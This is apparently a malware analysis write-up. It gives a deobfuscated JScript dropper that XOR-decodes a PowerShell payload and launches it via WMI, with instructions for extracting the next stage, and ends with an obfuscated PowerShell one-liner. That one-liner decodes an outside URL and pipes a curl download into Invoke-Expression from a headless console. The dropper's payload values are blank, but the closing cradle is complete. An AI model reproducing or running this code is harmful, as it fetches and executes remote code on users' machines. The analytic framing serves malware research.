//update.js UNID Malware

// JScript to be run by cscript.exe or wscript.exe

// Helper function to convert a hexadecimal string to a byte array (array of numbers)
function hex_string_to_byte_array(hex_str) {
    if (typeof hex_str !== 'string') {
        throw new Error('Input must be a string.');
    }
    if (hex_str.length % 2 !== 0) {
        // Original script had a stricter check, but this is common
        throw new Error('Hex string must have an even length.');
    }
    var bytes = [];
    for (var i = 0; i < hex_str.length; i += 2) {
        var byte_val = parseInt(hex_str.substring(i, i + 2), 16);
        if (isNaN(byte_val)) {
            throw new Error("Invalid hexadecimal pair: " + hex_str.substring(i, i + 2));
        }
        bytes.push(byte_val);
    }
    return bytes;
}

// --- Stage 1: Define the components for the PowerShell payload ---

// These strings were originally obtained by decoding other obfuscated strings.
// For the XOR decryption loop, the original script used decoder_2 to get "length" and "fromCharCode".
var DSTR_length = "length";
var DSTR_fromCharCode = "fromCharCode";

// Part 1 of the XORed payload (as a hex string)
var hex_payload_part1_str
// Key for the XOR decryption (as a hex string)
var hex_payload_key_str

// Convert hex strings to byte arrays
var payload_bytes_1 = hex_string_to_byte_array(hex_payload_part1_str);
var key_bytes = hex_string_to_byte_array(hex_payload_key_str);

// Perform XOR decryption to get the Base64 encoded PowerShell payload
var final_base64_powershell_payload = '';
for (var i = 0; i < payload_bytes_1[DSTR_length]; i++) { // DSTR_length is "length"
    final_base64_powershell_payload += String[DSTR_fromCharCode]( // DSTR_fromCharCode is "fromCharCode"
        payload_bytes_1[i] ^ key_bytes[i % key_bytes[DSTR_length]] // DSTR_length is "length"
    );
}
// At this point, final_base64_powershell_payload contains the actual PowerShell script, Base64 encoded.
// For your research, you would decode this Base64 string to see the PowerShell commands.

// --- Stage 2: Prepare for WMI Execution ---

// These strings were originally obtained by decoding 'initial_encoded_strings_1' using 'decoder_1'
var wmi_object_path = "WinMgmts:\\\\.\\root\\cimv2:Win32_Process";
var powershell_executable_name = "powershell.exe";
var powershell_encoding_argument = " -enc ";
var unused_application = "notepad"; // This was decoded but not used in the final effective command

// Assemble the parameters for WMI command construction
// This matches the order in the original `gqzoxvibpcsjrwln` array
var wmi_command_components = [
    wmi_object_path,                 // Index 0
    powershell_executable_name,      // Index 1
    powershell_encoding_argument,    // Index 2
    final_base64_powershell_payload, // Index 3
    unused_application               // Index 4
];

// --- Stage 3: Construct the command string for WMI's Create method ---

// The original script used a loop that effectively did the following for its final assignment:
// var constructed_command = wmi_command_components[2] + wmi_command_components[1] + wmi_command_components[3];
// This results in: " -enc " + "powershell.exe" + "<BASE64_PAYLOAD>"
var command_to_execute_via_wmi = wmi_command_components[2] +  // " -enc "
                                 wmi_command_components[1] +  // "powershell.exe"
                                 wmi_command_components[3];  // final_base64_powershell_payload

// --- Stage 4: Attempt WMI Execution ---
try {
    var wmi_service = GetObject(wmi_command_components[0]); // GetObject("WinMgmts:\\\\.\\root\\cimv2:Win32_Process")

    // The original script had two Create calls here with out-of-bounds indices.
    // These would have resulted in errors or no-ops (Create(undefined)).
    // e.g., wmi_service.Create(wmi_command_components[1135]); // Simplified from original calculation
    // e.g., wmi_service.Create(wmi_command_components[111547]);// Simplified from original calculation

    // This is the actual command execution attempt:
    wmi_service.Create(command_to_execute_via_wmi);

    // For research:
    // WScript.Echo("Attempted WMI Command: " + command_to_execute_via_wmi);
    // This command is malformed. It tries to run a program named " -enc " (with a leading space)
    // and passes "powershell.exe<BASE64_PAYLOAD>" as arguments. This will likely fail.

    // The LIKELY INTENDED command was probably:
    // var intended_command = powershell_executable_name + powershell_encoding_argument + final_base64_powershell_payload;
    // (i.e., "powershell.exe -enc <BASE64_PAYLOAD>")
    // WScript.Echo("Likely Intended WMI Command: " + intended_command);

} catch (e) {
    // Error handling, e.g., WScript.Echo("WMI Execution Error: " + e.description);
}

// To see the Base64 PowerShell payload for further analysis:
// WScript.Echo("Base64 Encoded PowerShell Payload:\n" + final_base64_powershell_payload);

Save the code above as a .js file (e.g., deobfuscated_malware.js).
Crucially, to get the actual PowerShell payload, you need to decode the final_base64_powershell_payload string. You can do this by:
Adding WScript.Echo(final_base64_powershell_payload); at the end of the script and running it with cscript.exe deobfuscated_malware.js in a safe, isolated environment (like a virtual machine disconnected from the internet).
Copying the final_base64_powershell_payload string from the script (if you run the generation part in a browser console, for instance) and using an online Base64 decoder or a tool like CyberChef.
Analyze the decoded PowerShell script. This will be the next stage of the malware.

//.ps script
conhost --headless powershell $layuijrongphm='ur' ;set-alias protons c$($layuijrongphm)l;$ciwzqp=(2486,2474,2471,2484,2481,2467,2470,2485,2491,2485,2486,2471,2479,2485,2416,2469,2481,2479,2417,2419,2416,2482,2474,2482,2433,2485,2431,2472,2478,2475,2468,2467,2468,2469,2420,2423);$lkshbfw=('ertigos','get-cmdlet');$pifsldbhqtavc=$ciwzqp;foreach($rouzgvme in $pifsldbhqtavc){$xjglich=$rouzgvme;$mqtxuifgkyv=$mqtxuifgkyv+[char]($xjglich-2370);$fvxgluia=$mqtxuifgkyv; $yqxokiz=$fvxgluia};$kfiztqcbejdgh[2]=$yqxokiz;$usckmwi='rl';$yshcaglnkf=1;.$([char](((200 + 30) - (100 + 25)))+'e'+'x')(protons -useb $yqxokiz)
powershell $layuijrongphm='ur' ;set-alias protons c$($layuijrongphm)l;$ciwzqp=(2486,2474,2471,2484,2481,2467,2470,2485,2491,2485,2486,2471,2479,2485,2416,2469,2481,2479,2417,2419,2416,2482,2474,2482,2433,2485,2431,2472,2478,2475,2468,2467,2468,2469,2420,2423);$lkshbfw=('ertigos','get-cmdlet');$pifsldbhqtavc=$ciwzqp;foreach($rouzgvme in $pifsldbhqtavc){$xjglich=$rouzgvme;$mqtxuifgkyv=$mqtxuifgkyv+[char]($xjglich-2370);$fvxgluia=$mqtxuifgkyv; $yqxokiz=$fvxgluia};$kfiztqcbejdgh[2]=$yqxokiz;$usckmwi='rl';$yshcaglnkf=1;.$([char](((200 + 30) - (100 + 25)))+'e'+'x')(protons -useb $yqxokiz)
